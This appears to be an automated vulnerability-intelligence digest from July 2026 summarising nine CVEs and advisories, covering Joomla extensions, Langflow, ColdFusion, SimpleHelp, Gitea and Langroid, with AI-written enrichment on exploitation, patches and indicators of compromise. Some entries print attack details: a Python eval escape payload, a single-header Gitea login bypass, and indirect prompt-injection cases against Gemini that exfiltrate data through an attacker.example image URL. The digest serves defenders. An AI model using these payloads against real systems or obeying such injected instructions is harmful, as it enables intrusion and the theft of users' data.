# Zero Day Pulse

> **Generated:** 2026-07-07 19:37 UTC &nbsp;|&nbsp; **Total:** 49 &nbsp;|&nbsp; 🔴 KEV: 4 &nbsp;|&nbsp; 🟠 Zero-Day: 15 &nbsp;|&nbsp; 🟡 High: 30 &nbsp;|&nbsp; ✨ Enriched: 10

---

## 1. 🔴 CISA KEV — CVE-2026-56290 — Joomlack Page Builder Improper Access Control Vulnerability

**CVE:** `CVE-2026-56290` &nbsp;|&nbsp; **Source:** CISA KEV &nbsp;|&nbsp; **Published:** 2026-07-07
**Reference:** <https://nvd.nist.gov/vuln/detail/CVE-2026-56290>

> Vendor: Joomlack | Product: Page Builder. Joomlack Page Builder contains an improper access control vulnerability that could allow for remote code execution via unauthenticated arbitrary file upload. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA’s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA’s …

**Parallel AI Enrichment:**

- **Technical Details:** CVE-2026-56290 is an unauthenticated arbitrary file upload vulnerability in the Joomlack 'Page Builder CK' Joomla extension. The upload endpoint does not verify that the caller has a valid administrator session, does not require/use a valid Joomla anti-CSRF token (the token value can be read from public Joomla pages), and does not enforce a safe allowlist on file extensions or MIME types. An unauthenticated remote attacker can therefore send a crafted multipart HTTP POST containing a PHP payload (.php, .phtml, .phar, etc.), choose the destination folder and filename, and write an executable file under the Joomla web root (commonly observed at /media/com_pagebuilderck/ or its subfolders). The uploaded PHP file is then executed by the web server, yielding full remote code execution on the underlying host.
- **Affected Products:** Joomlack Page Builder CK (Joomla extension), all versions prior to 3.6.0 (current Joomla 5/6 line); equivalent patched lines are 3.4.10 for Joomla 4 and 3.1.1 for Joomla 3 — so all Page Builder CK versions on Joomla 3 < 3.1.1 and Joomla 4 < 3.4.10 are also affected. Vulnerability databases additionally list legacy versions 1.1.9–1.1.15 and 3.5.6–3.5.10 as confirmed-affected builds.
- **CVSS Score:** 9.8
- **CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **Exploit Available:** true — public proof-of-concept available. Source URLs: https://github.com/advisories/GHSA-gxrr-wfg5-xqqf (GitHub Security Advisory), https://x.com/ptdbugs/status/2073688375710642674 (PoC disclosure tweet with PT ID PT-2026-53285), and https://securityvulnerability.io/vulnerability/CVE-2026-56290 (PoC availability confirmed). PoC was also indexed in the GitHub nomi-sec 'PoC-in-GitHub' repository on 2026-06-29.
- **Patch Available:** true — Vendor Joomlack released Page Builder CK 3.6.0 (current Joomla 5/6 line), 3.4.10 (Joomla 4) and 3.1.1 (Joomla 3) on 2026-06-27 to fix the vulnerability. Patch/advisory URLs: https://www.joomlack.fr/en/joomla-extensions/page-builder-ck and https://forum.joomlack.fr/index.php/page-builder-ck/21627-nouvelle-version-de-pbck-et-joomla-3
- **Active Exploitation:** true — CVE-2026-56290 was added to the CISA Known Exploited Vulnerabilities (KEV) Catalog (entry titled 'Joomlack Page Builder Improper Access Control Vulnerability', referenced as CVE Modified by CISA-ADP on 2026-06-29). Independent reporting (mysites.guru blog and securityvulnerability.io) confirms exploitation in the wild with post-exploitation artifacts including web shells under /media/com_pagebuilderck/ (e.g., /media/com_pagebuilderck/gfonts/bhup.php).
- **Threat Actors:** None known
- **Mitigation:** Apply the vendor patch by upgrading Page Builder CK to 3.6.0 (current Joomla 5/6 line), 3.4.10 (Joomla 4), or 3.1.1 (Joomla 3). Apply mitigations in accordance with CISA BOD 26-04 (Prioritizing Security Updates Based on Risk) and follow CISA's 'Forensics Triage Requirements'. Prior to patching, assess whether the system was already compromised by inspecting for stray .php files and web shells under /media/com_pagebuilderck/ and subfolders (a web shell observed in the wild was /media/com_pagebuilderck/gfonts/bhup.php). For cloud-hosted deployments where mitigations are not available, discontinue use of the affected product version.
- **Vendor Advisory:** https://www.joomlack.fr/en/joomla-extensions/page-builder-ck (announces 'VERSION 3.6.0 - 27/06/26. IMPORTANT: Fix security issue') and the vendor's forum post https://forum.joomlack.fr/index.php/page-builder-ck/21627-nouvelle-version-de-pbck-et-joomla-3

---

## 2. 🔴 CISA KEV — CVE-2026-48908 — JoomShaper SP Page Builder Unrestricted Upload of File with Dangerous Type Vulnerability

**CVE:** `CVE-2026-48908` &nbsp;|&nbsp; **Source:** CISA KEV &nbsp;|&nbsp; **Published:** 2026-07-07
**Reference:** <https://nvd.nist.gov/vuln/detail/CVE-2026-48908>

> Vendor: JoomShaper | Product: SP Page Builder. JoomShaper SP Page Builder contains an unrestricted upload of file with dangerous type vulnerability that allows unauthenticated users to upload arbitrary files, ultimately resulting in the upload and execution of PHP code. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA’s BOD 26-04 Prioritizing…

**Parallel AI Enrichment:**

- **Technical Details:** CWE-434 (Unrestricted Upload of File with Dangerous Type) vulnerability in JoomShaper SP Page Builder for Joomla. The unauthenticated endpoint 'index.php?option=com_sppagebuilder&task=asset.uploadCustomIcon' fails to enforce authentication, CSRF protection, or file-type/extension validation. An unauthenticated remote attacker sends a crafted multipart/form-data POST request (e.g., with attacker-controlled archive contents) causing attacker-chosen filenames such as .php webshells to be extracted into web-accessible directories such as /media/com_sppagebuilder/assets/iconfont/ or images/<random>/fonts/. Subsequent HTTP requests to the uploaded file path cause PHP execution under Joomla/web-server privileges, yielding unauthenticated RCE.
- **Affected Products:** JoomShaper SP Page Builder (Joomla extension) versions 1.0.0 through 6.6.1
- **CVSS Score:** 9.8
- **CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **Exploit Available:** true - Public proof-of-concept available at https://github.com/papageo75/CVE-2026-48908-PoC (unauthenticated RCE PoC targeting SP Page Builder ≤ 6.6.1 via asset.uploadCustomIcon)
- **Patch Available:** true - JoomShaper released SP Page Builder v6.6.2 (announced on https://www.joomshaper.com/forum/question/45152, referenced on NVD https://nvd.nist.gov/vuln/detail/CVE-2026-48908, and covered by GitHub Advisory GHSA-8fwr-8fxr-8v2p)
- **Active Exploitation:** true - CVE-2026-48908 is listed in the CISA KEV Catalog (required action per BOD 26-04), and independent reporting (Censys, mysites.guru, GitHub Advisory GHSA-8fwr-8fxr-8v2p, Ionix) documents active in-the-wild exploitation including automated campaigns delivering PHP file-manager backdoors and creating hidden Joomla Super Administrator accounts.
- **Threat Actors:** None known
- **Mitigation:** 1) Upgrade SP Page Builder to v6.6.2 (vendor-published fix per JoomShaper staff and NVD). 2) Apply mitigations per CISA's BOD 26-04 'Prioritizing Security Updates Based on Risk' and 'Forensics Triage Requirements' (mandated by CISA KEV). 3) Defensively block unauthenticated POSTs to ?option=com_sppagebuilder&task=asset.uploadCustomIcon at the WAF/web layer. 4) Forensically audit Joomla sites for indicators of compromise: rogue Joomla Super User accounts with @secure.local emails; Super Admin usernames combining a role word plus two digits (e.g., webeditor42, contentmgr57, sysadmin83, webmaster09); unexpected .php files under images/<random>/fonts/ or /media/com_sppagebuilder/assets/iconfont/; PHP file-manager backdoors (users.php containing 'PHP File manager') under /media/com_admin/ or /media/regularlabs/; review SP Page Builder 'IconsTrait.php' file even after 6.6.2 upgrade per forum thread 45358.
- **Vendor Advisory:** https://www.joomshaper.com/forum/question/45152

---

## 3. 🔴 CISA KEV — CVE-2026-55255 — Langflow Authorization Bypass Through User-Controlled Key Vulnerability

**CVE:** `CVE-2026-55255` &nbsp;|&nbsp; **Source:** CISA KEV &nbsp;|&nbsp; **Published:** 2026-07-07
**Reference:** <https://nvd.nist.gov/vuln/detail/CVE-2026-55255>

> Vendor: Langflow | Product: Langflow. Langflow contains an authorization bypass through user-controlled key vulnerability which allows an authenticated attacker to execute any flow belonging to another user by specifying the victim&#x27;s flow ID in the request. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA’s BOD 26-04 Prioritizing Securit…

**Parallel AI Enrichment:**

- **Technical Details:** CWE-639 (Authorization Bypass Through User-Controlled Key). Insecure Direct Object Reference (IDOR) in the /api/v1/responses endpoint of Langflow, rooted in the get_flow_by_id_or_endpoint_name helper in src/backend/base/langflow/helpers/flow.py. When a flow is looked up by UUID (flow_id), the function queries the database by primary key without verifying that the caller's user_id matches the flow's owner, allowing any authenticated user to execute any flow belonging to another user simply by supplying that user's flow ID in the request body. Because 122-bit flow UUIDs are not brute-forceable, real-world attackers first enumerate object-ID disclosure endpoints (e.g., /api/v1/flows/) to harvest other users' flow IDs and then replay them against /api/v1/responses to invoke the victim flow (e.g., POST to http://localhost:7860/api/v1/responses with the victim's flow ID in the 'model' field), gaining access to sensitive data processed by those flows and consuming the victim's resources. The flaw is cross-tenant on managed SaaS/multi-tenant deployments where the application layer is what segregates tenants.
- **Affected Products:** Langflow < 1.9.1 (fixed in Langflow 1.9.1; later 1.9.2 also confirmed patched)
- **CVSS Score:** 9.9
- **CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L
- **Exploit Available:** true — Proof-of-concept code is included in the official GitHub security advisory (curl-based POST to http://localhost:7860/api/v1/responses placing the victim's flow ID in the 'model' field). Source: https://github.com/langflow-ai/langflow/security/advisories/GHSA-qrpv-q767-xqq2
- **Patch Available:** true — fix shipped in Langflow 1.9.1 via PR https://github.com/langflow-ai/langflow/pull/12832; advisory at https://github.com/langflow-ai/langflow/security/advisories/GHSA-qrpv-q767-xqq2
- **Active Exploitation:** true — Sysdig Threat Research Team observed the first known in-the-wild/exploit-in-the-wild attacks on June 25, 2026 (reported June 26, 2026). Source: https://www.sysdig.com/blog/understanding-langflow-cve-2026-55255-and-why-higher-cvss-vulnerabilities-arent-always-the-most-exploited
- **Threat Actors:** None known. Sysdig Threat Research Team reported the observed exploitation was performed by an opportunistic, financially motivated operator using a scripted toolkit (no specific APT or ransomware group identified).
- **Mitigation:** Upgrade Langflow to version 1.9.1 or later (the fix landed in GitHub PR langflow-ai/langflow#12832 and is shipped in 1.9.1 / 1.9.2). Until upgraded, treat object-ID disclosure endpoints such as /api/v1/flows/ as part of the IDOR attack surface; in cloud-hosted Langflow deployments, follow CISA BOD 26-04 'Prioritizing Security Updates Based on Risk' guidance and CISA's 'Forensics Triage Requirements' guidance, or discontinue use of the product. Use of flow_name lookups (which were already owner-checked) rather than flow_id avoids the vulnerable code path.
- **Vendor Advisory:** https://github.com/langflow-ai/langflow/security/advisories/GHSA-qrpv-q767-xqq2

---

## 4. 🔴 CISA KEV — CVE-2026-48282 — Adobe ColdFusion Path Traversal Vulnerability

**CVE:** `CVE-2026-48282` &nbsp;|&nbsp; **Source:** CISA KEV &nbsp;|&nbsp; **Published:** 2026-07-07
**Reference:** <https://nvd.nist.gov/vuln/detail/CVE-2026-48282>

> Vendor: Adobe | Product: ColdFusion. Adobe ColdFusion contains a path traversal vulnerability that could lead to arbitrary code execution in the context of the current user. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA’s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA’s “Forensics Triage Requirem…

**Parallel AI Enrichment:**

- **Technical Details:** Adobe ColdFusion contains an Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') vulnerability classified as CWE-22 that allows unauthenticated arbitrary file write and read in the context of the current user, which can be leveraged to achieve arbitrary code execution on the server. The flaw is network-exploitable, requires no user interaction and no prior authentication, and has a 'changed' scope. Independent research (Mallory) labels the underlying bug as reachable through the Adobe ColdFusion RDS FILEIO endpoint, producing an unauthenticated pre-auth RCE chain.
- **Affected Products:** Adobe ColdFusion 2025 Update 9 and earlier versions; Adobe ColdFusion 2023 Update 20 and earlier versions
- **CVSS Score:** 10.0
- **CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
- **Exploit Available:** true - Weaponized exploitation confirmed in the wild by KEVIntel's global honeypot network. A published exploitation timeline/technical write-up is available at https://kevintel.com/CVE-2026-48282 (per KEVIntel founder Ryan Dewhurst, referenced from the r/coldfusion thread).
- **Patch Available:** true - Adobe Security Bulletin APSB26-68 (published June 30, 2026) provides the fix in Adobe ColdFusion 2025 Update 10 and Adobe ColdFusion 2023 Update 21 (advisory URL: https://helpx.adobe.com/security/products/coldfusion/apsb26-68.html).
- **Active Exploitation:** true - Confirmed in-the-wild exploitation by KEVIntel (founder Ryan Dewhurst). Within under two hours of public disclosure on July 2, 2026, KEVIntel captured exploitation of CVE-2026-48282 across its global honeypot network; the attack originated from IP 103.207.14[.]220, geolocated to India, and achieved unauthenticated arbitrary file write and read on Adobe ColdFusion servers. Sources: BleepingComputer (https://www.bleepingcomputer.com/news/security/max-severity-adobe-coldfusion-flaw-now-exploited-in-attacks/), SecurityAffairs (https://securityaffairs.com/194837/hacking/adobe-coldfusion-flaw-cve-2026-48282-now-exploited-in-the-wild.html), and The Hacker News (https://thehackernews.com/2026/07/adobe-patches-7-cvss-100-flaws-in.html).
- **Threat Actors:** No specific threat actor group, APT campaign, or ransomware operator has been publicly attributed. Vulnerability-intelligence company KEVIntel (founder Ryan Dewhurst) observed in-the-wild exploitation originating from IP address 103.207.14[.]220, geolocated to India, but has not attributed the activity to a named actor.
- **Mitigation:** Apply the official Adobe updates from APSB26-68: upgrade Adobe ColdFusion 2025 to Update 10 or Adobe ColdFusion 2023 to Update 21 (Adobe recommends installing within 72 hours). Additionally, restrict or remove internet exposure of ColdFusion Admin / CFIDE endpoints, review web-server logs from July 2, 2026 onward for suspicious traversal or file-write requests, and use WAF rules or temporary virtual-patching controls while the official update is rolled out. Follow CISA BOD 26-04 guidance (including 'Forensics Triage Requirements') and discontinue use of cloud-services instances of the product if mitigations are unavailable.
- **Vendor Advisory:** https://helpx.adobe.com/security/products/coldfusion/apsb26-68.html

---

## 5. 🟠 Zero-Day — Ransomware Actors Exploit Unpatched SimpleHelp Remote Monitoring and Management to Compromise Utility Billing Software Provider

**CVE:** `CVE-2024-57727` &nbsp;|&nbsp; **Source:** CISA US-CERT Alerts &nbsp;|&nbsp; **Published:** Thu, 12 Ju
**Reference:** <https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-163a>

> Summary The Cybersecurity and Infrastructure Security Agency (CISA) is releasing this advisory in response to ransomware actors leveraging unpatched instances of a vulnerability in SimpleHelp Remote Monitoring and Management (RMM) to compromise customers of a utility billing software provider. This incident reflects a broader pattern of ransomware actors targeting organizations through unpatched v…

**Parallel AI Enrichment:**

- **Technical Details:** SimpleHelp remote support software v5.5.7 and earlier contains an Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') flaw (CWE-22). Multiple unauthenticated path-traversal vulnerabilities in the HTTP handler let a remote attacker craft HTTP requests that traverse outside the intended directory and download arbitrary files from the SimpleHelp host. Exposed material includes server configuration files containing secrets and hashed user passwords, which can be used to gain further access to the SimpleHelp instance and any downstream/managed endpoints.
- **Affected Products:** SimpleHelp Remote Support / RMM software version 5.5.7 and all earlier releases
- **CVSS Score:** 7.5
- **CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
- **Exploit Available:** true — Public proof-of-concept exploit code is available at https://github.com/imjdl/CVE-2024-57727 (a Python script, poc.py, that takes a target URL as an argument and tests for path-traversal-driven arbitrary-file download).
- **Patch Available:** true — SimpleHelp v5.5.8 (current branch) at https://simple-help.com/downloads; legacy-branch patches v5.4.10 (https://simple-help.com/releases/patch-5.4-010725/shelp-jar-with-dependencies.jar) and v5.3.9 (https://simple-help.com/releases/patch-5.3.9-010725/patch.zip). Vendor security bulletin: https://guides.simple-help.com/kb---security-vulnerabilities-01-2025.
- **Active Exploitation:** true — Confirmed in the wild. CISA advisory AA25-163A (Jun 12, 2025): ransomware actors (DragonForce) leveraged CVE-2024-57727 against unpatched SimpleHelp RMM since January 2025, including a compromise of a utility billing software provider and its downstream customers. CVE-2024-57727 was added to the CISA Known Exploited Vulnerabilities (KEV) catalog on 2025-02-13 with a remediation due date of 2025-03-06. Sources: https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-163a and https://nvd.nist.gov/vuln/detail/cve-2024-57727.
- **Threat Actors:** DragonForce ransomware operators. CISA advisory AA25-163A attributes double-extortion compromises of an MSP and its downstream utility-billing-software customer to DragonForce, which leveraged CVE-2024-57727 against unpatched SimpleHelp RMM instances (activity ongoing since January 2025). The same advisory describes a broader pattern of unnamed 'ransomware actors' targeting organizations through unpatched SimpleHelp versions.
- **Mitigation:** Upgrade SimpleHelp to a fixed release as soon as possible: v5.5.8 or later from https://simple-help.com/downloads (legacy-branch patches v5.4.10 and v5.3.9 are also published by the vendor). Per CISA KEV (added 2025-02-13, due 2025-03-06), organizations that cannot apply the vendor patch should discontinue use of the product. Additional hardening: keep SimpleHelp off the public internet where possible, segment RMM traffic, force credential resets for any admin account that touched an unpatched instance, monitor SimpleHelp logs/registry keys for unauthorized access, and audit downstream customer environments for downstream compromise.
- **Vendor Advisory:** https://guides.simple-help.com/kb---security-vulnerabilities-01-2025

---

## 6. 🟠 Zero-Day — Critical Gitea Flaw Under Active Exploitation, Researchers Warn

**CVE:** `CVE-2026-20896` &nbsp;|&nbsp; **Source:** SecurityWeek &nbsp;|&nbsp; **Published:** 2026-07-07
**Reference:** <https://www.securityweek.com/critical-gitea-flaw-under-active-exploitation-researchers-warn/>

> Attackers are exploiting the critical Gitea vulnerability CVE-2026-20896 to bypass authentication with a single HTTP header and access vulnerable repositories and secrets. The post Critical Gitea Flaw Under Active Exploitation, Researchers Warn appeared first on SecurityWeek .

**Parallel AI Enrichment:**

- **Technical Details:** The official Gitea Docker image ships an app.ini template that hard-codes REVERSE_PROXY_TRUSTED_PROXIES = * (wildcard matching every source IP), instead of the documented safe default of 127.0.0.0/8,::1/128 (loopback only). When an administrator enables ENABLE_REVERSE_PROXY_AUTHENTICATION=true to deploy Gitea behind an authenticating reverse proxy, the wildcard renders the source-IP check meaningless. Any unauthenticated network attacker who can reach the Gitea container's HTTP port can send a single request with the header X-WEBAUTH-USER: <target_username> and be logged in as that user without supplying credentials. If ENABLE_REVERSE_PROXY_AUTO_REGISTRATION is additionally enabled, attackers can create arbitrary new accounts (including admin). Compromised admin yields full platform access: private repositories, CI/CD secrets, SSH key injection, and complete server takeover.
- **Affected Products:** Gitea Docker image (gitea/gitea) versions <=1.26.2 (both standard and rootless variants affected via hard-coded REVERSE_PROXY_TRUSTED_PROXIES=* in the app.ini template). Non-Docker binary distributions using the documented default (127.0.0.0/8,::1/128) are NOT affected.
- **CVSS Score:** 9.8
- **CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **Exploit Available:** true — public PoC published at https://github.com/rz1027/CVE-2026-20896
- **Patch Available:** true — official vendor patches released in Gitea 1.26.3 and 1.26.4; advisory at https://github.com/go-gitea/gitea/security/advisories/GHSA-f75j-4cw6-rmx4 and release notes at https://blog.gitea.com/release-of-1.26.3-and-1.26.4/
- **Active Exploitation:** true — confirmed active in-the-wild probing observed by Sysdig Threat Research Team 13 days post-disclosure, originating from ProtonVPN exit node IP 159.26.98[.]241. Sources: SecurityWeek (https://www.securityweek.com/critical-gitea-flaw-under-active-exploitation-researchers-warn/) and The Hacker News (https://thehackernews.com/2026/07/threat-actors-probe-gitea-docker-flaw.html), based on Sysdig telemetry. Observed activity characterized as initial reconnaissance-level probing (header impersonation attempts against admin usernames).
- **Threat Actors:** None known. Unnamed threat actors have been observed probing internet-exposed Gitea Docker instances (first attempts traced to ProtonVPN exit node 159.26.98[.]241) per Sysdig telemetry, but no specific APT, ransomware group, or named campaign has been publicly attributed to exploitation of CVE-2026-20896.
- **Mitigation:** Upgrade Gitea Docker deployments to version 1.26.3 or 1.26.4 (or later) immediately; the patched versions change the default so that reverse-proxy authentication is opt-in and the wildcard no longer ships. If immediate upgrade is not possible: (1) set REVERSE_PROXY_TRUSTED_PROXIES to the actual IP or CIDR of the authenticating reverse proxy (never use *), (2) disable ENABLE_REVERSE_PROXY_AUTHENTICATION if reverse-proxy auth is not required, and (3) ensure the Gitea HTTP port is not directly reachable from the internet — it must only be exposed to the trusted reverse proxy.
- **Vendor Advisory:** https://github.com/go-gitea/gitea/security/advisories/GHSA-f75j-4cw6-rmx4

---

## 7. 🟠 Zero-Day — Langroid: Neo4jChatAgent executes LLM-generated Cypher without validation (prompt-to-Cypher injection; config-conditional RCE), mirroring the SQLChatAgent bug fixed in CVE-2026-25879

**CVE:** `CVE-2026-55615` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-06
**Reference:** <https://github.com/advisories/GHSA-2pq5-3q89-j7cc>

> Neo4jChatAgent passes LLM-generated Cypher queries straight to the Neo4j driver with no validation, no statement-type allowlist, and no opt-out gate. The query text is influenceable by prompt injection (direct user input or indirect content the agent reads back via RAG), so an attacker who can influence the prompt can read or destroy all graph data and, when APOC or dbms.security procedures are en…

**Parallel AI Enrichment:**

- **Technical Details:** Neo4jChatAgent owns two tools (CypherRetrievalTool, CypherCreationTool) whose `cypher_query` is supplied by the LLM with zero validation or allowlist, and is passed straight to the Neo4j Python driver via session.run()/tx.run(). Prompt injection (direct or via RAG) gives an attacker full graph read/write/destruction, SSRF via LOAD CSV FROM, and — where APOC or dbms.security procedures are enabled — OS-command and filesystem access through apoc.load.url and apoc.cypher.runFile. The defect class and threat model mirror CVE-2026-25879 (SQLChatAgent prompt-to-SQL-to-RCE, fixed in 0.63.0).
- **Affected Products:** langroid (Python pip package) <= 0.65.4 — specifically Neo4jChatAgent component (CypherRetrievalTool and CypherCreationTool); fixed in 0.65.5
- **CVSS Score:** 9.8
- **CVSS Vector:** CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **Exploit Available:** true (PoC payload Cypher queries published by SecureLayer7 Labs at https://securelayer7.net/lab/cve-2026-55615-langroid-neo4jchatagent-cypher-injection-rce ; static sink trace / reproduction method also included in the GitHub advisory at https://github.com/advisories/GHSA-2pq5-3q89-j7cc)
- **Patch Available:** true — Langroid 0.65.5 (PyPI). Advisory: https://github.com/advisories/GHSA-2pq5-3q89-j7cc ; fix commit: https://github.com/langroid/langroid/commit/b9df06f71e6ea03180a971e4247b1d95d154384d
- **Active Exploitation:** false (no confirmed in-the-wild exploitation reported; CVE-2026-55615 is not yet listed in the CISA KEV catalog, and no threat-actor or ransomware-campaign attribution has been published)
- **Threat Actors:** None known
- **Mitigation:** Upgrade langroid to 0.65.5 or later. The fix adds an `allow_dangerous_operations` config flag (default False), makes the retrieval tool read-only, and blocks code-execution/file/network primitives in the creation tool. Until upgraded, run agents against a least-privilege Neo4j role and disable APOC and dbms.security procedures on the Neo4j server, sanitise user inputs, restrict RAG sources, and require explicit read-only intent for retrieval queries.
- **Vendor Advisory:** https://github.com/advisories/GHSA-2pq5-3q89-j7cc

---

## 8. 🟠 Zero-Day — Langroid: Sandbox Escape to Remote Code Execution via Incomplete `eval()` Mitigation in TableChatAgent

**CVE:** `CVE-2026-54769` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-06
**Reference:** <https://github.com/advisories/GHSA-q9p7-wqxg-mrhc>

> ### Advisory Details
**Title**: Sandbox Escape to Remote Code Execution via Incomplete `eval()` Mitigation in TableChatAgent

**Description**:
### Summary
Langroid is vulnerable to a critical Sandbox Escape leading to Remote Code Execution (RCE) in its `TableChatAgent` and `VectorStore` capabilities. When these agents evaluate LLM-generated tool messages with `full_eval=True`, they attempt to sand…

**Parallel AI Enrichment:**

- **Technical Details:** Langroid's `TableChatAgent.pandas_eval` (langroid/agent/special/table_chat_agent.py) and the secondary location in `VectorStoreBase.compute_from_docs` (langroid/vector_store/base.py) evaluate LLM-generated tool messages with Python's built-in `eval()` when `full_eval=True`. The library attempts to 'sandbox' the call by passing an empty dict as `locals` to `eval()`. This mitigation is incomplete: Python's `eval()` implicitly injects the full builtins namespace (`__builtins__`, including `__import__`) into the `globals` mapping during execution, so an empty `locals` does NOT isolate the call. Any code path whose output an attacker can influence — prompt injection against the LLM, malicious content ingested into the vector store, or any other upstream that feeds the tool message — can supply an expression such as `__import__('os').system(...)` (or a dunder-chain variant) that escapes the empty-locals sandbox and runs arbitrary Python on the host, producing direct Remote Code Execution. CWE-94 (Code Injection); critical because `full_eval=True` is the documented high-trust path used by Langroid agents.
- **Affected Products:** langroid (PyPI package) versions <= 0.65.1
- **CVSS Score:** 10.0
- **CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
- **Exploit Available:** true — a proof-of-concept is documented inline in the official GitHub Security Advisory GHSA-q9p7-wrxg-mrhc (https://github.com/advisories/GHSA-q9p7-wrxg-mrhc): start a TableChatAgent with `full_eval=True`, prompt-inject the agent so its `pandas_eval` tool receives an expression such as `__import__('os').system('touch /tmp/rce_success_table')`, which executes on the host despite the empty-locals sandbox.
- **Patch Available:** true — official patch released as langroid 0.65.2 (PyPI / GitHub release "0.65.2 — Security release"). Advisory: https://github.com/advisories/GHSA-q9p7-wqxg-mrhc
- **Active Exploitation:** false — no confirmed in-the-wild exploitation of CVE-2026-54769 has been reported in the GitHub Security Advisory, Endorlabs mirror, Corgea advisories, langroid release notes, or general threat-intelligence sources reviewed as of 2026-07-07. The GHSA is rated Critical 10.0/10 and a PoC is documented in the advisory itself, but there is no public reporting of mass exploitation or APT/crimeware use tied to this CVE.
- **Threat Actors:** None known
- **Mitigation:** Upgrade langroid to version 0.65.2 or later (the official security release that closes the sandbox-escape in TableChatAgent.pandas_eval and VectorStoreBase.compute_from_docs). Until the upgrade is applied, do not enable `full_eval=True` on agents whose tool-message inputs come from untrusted or externally-influenced LLM output (e.g., anything reachable via prompt injection, user-uploaded documents ingested by the vector store, or third-party tool callers), and treat any Langroid agent that exposes eval-based tool execution as untrusted code-execution surface.
- **Vendor Advisory:** https://github.com/advisories/GHSA-q9p7-wqxg-mrhc

---

## 9. 🟠 Zero-Day — AI threats in the wild: The current state of prompt injections on the web

**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** Google Security Blog &nbsp;|&nbsp; **Published:** 2026-04-23
**Reference:** <http://security.googleblog.com/2026/04/ai-threats-in-wild-current-state-of.html>

> Posted by Thomas Brunner, Yu-Han Liu, Moni Pande At Google, our Threat Intelligence teams are dedicated to staying ahead of real-world adversarial activity, proactively monitoring emerging threats before they can impact users. Right now, Indirect Prompt Injection (IPI) is a top priority for the security community, anticipating it as a primary attack vector for adversaries to target and compromise …

**Parallel AI Enrichment:**

- **Technical Details:** Indirect Prompt Injection (IPI) is an attack technique against LLM-powered agents in which untrusted external content (web pages, emails, documents, calendar invites, images, or tool responses) carries hidden instructions that the model treats as authoritative commands, collapsing the trust boundary between data and instructions in the model's context window. Documented variants include: (1) invisible/in-page IPI on websites designed for AI crawlers and summarizers ranging from invisible text that reskins the assistant's tone to SEO/SERP-poisoning prompts, infinite-stream payloads that cause timeouts, and payloads instructing 'delete all files on the user's machine'; (2) zero-click 'GeminiJack' IPI against Gemini Enterprise and Vertex AI Search (Noma Labs, 2025-12-08) — attacker plants instructions in a shared Doc, Gmail message, or Calendar invite; malicious instructions tell Gemini to search the user's own Gmail/Calendar/Docs for sensitive terms (e.g., 'budget', 'finance') and embed the results as part of an image URL `https://attacker.example/image2.svg?x=<leaked>` which the model renders, exfiltrating data via a single HTTP request; (3) semantic calendar-invite IPI against Google Gemini in Workspace (Miggo, 2026-01-19) — a malicious free-text calendar event description instructs Gemini to enumerate and summarize meetings, then use the Calendar.create tool to insert the summary into a new event exfiltrated to an attacker-controlled attendee; (4) Forcepoint X-Labs' ten in-the-wild payloads spanning API-key theft, content suppression, traffic hijacking, brand impersonation, RCE/data destruction, unauthorized financial transactions, system-prompt leaks, and payment redirection. Google's measurement of '2-3 billion crawled pages per month' showed a 32% relative increase in malicious IPI between November 2025 and February 2026.
- **Affected Products:** Google Gemini (consumer Apps), Google Workspace with Gemini (Calendar, Gmail, Docs integrations), Google Gemini Enterprise, Google Vertex AI Search, ChatGPT (with browsing/plugins), Microsoft 365 Copilot, GitHub Copilot, Cursor, Anthropic Claude Code, AI-powered CI/CD reviewers, Perplexity, OpenAI Atlas browser, Perplexity Comet browser. Specific version numbers are not applicable for these continuously updated SaaS products; GeminiJack was fixed in Gemini Enterprise and Vertex AI Search in the December 2025 update cycle, and the Workspace Gemini Calendar integration was hardened following Miggo's 2026-01-19 responsible disclosure.
- **CVSS Score:** CVSS score unavailable.
- **CVSS Vector:** CVSS vector unavailable.
- **Exploit Available:** true. Sources: https://noma.security/blog/geminijack-google-gemini-zero-click-vulnerability; https://miggo.io/post/weaponizing-calendar-invites-a-semantic-attack-on-google-gemini; https://swisskyrepo.github.io/PayloadsAllTheThings/Prompt%20Injection/; https://github.com/brennanbrown/atlas-prompt-injection-poc; https://forcepoint.com/blog/x-labs/indirect-prompt-injection-payloads; https://blog.trailofbits.com/2025/08/06/prompt-injection-engineering-for-attackers-exploiting-github-copilot/
- **Patch Available:** true (for specific, bounded exploits). GeminiJack was patched in Google Gemini Enterprise and Vertex AI Search in December 2025, with publicly reported rollout by 2025-12-10. The Workspace Gemini Calendar integration was hardened following Miggo's 2026-01-19 responsible disclosure. Advisory: https://www.securityweek.com/google-patches-gemini-enterprise-vulnerability-exposing-corporate-data/ ; https://www.infosecurity-magazine.com/news/google-fixes-gemini-enterprise-flaw/ . However, there is no single patch for the broader Indirect Prompt Injection class — reports continue to be coordinated through the AI Vulnerability Reward Program: https://bughunters.google.com/about/rules/google-friends/ai-vulnerability-reward-program-rules.
